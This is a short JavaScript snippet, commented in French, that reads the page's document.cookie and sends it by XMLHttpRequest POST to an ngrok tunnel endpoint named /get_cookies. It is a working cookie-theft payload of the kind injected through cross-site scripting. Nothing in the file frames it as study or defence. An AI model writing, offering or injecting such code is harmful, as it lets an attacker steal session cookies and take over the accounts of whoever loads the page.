var cookies = document.cookie;

var serverUrl = "https://62f4-2-15-191-195.ngrok-free.app/get_cookies";

var xhr = new XMLHttpRequest();
xhr.open("POST", serverUrl, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

var data = "cookies=" + encodeURIComponent(cookies);

// Envoyer la requête avec les cookies
xhr.send(data);
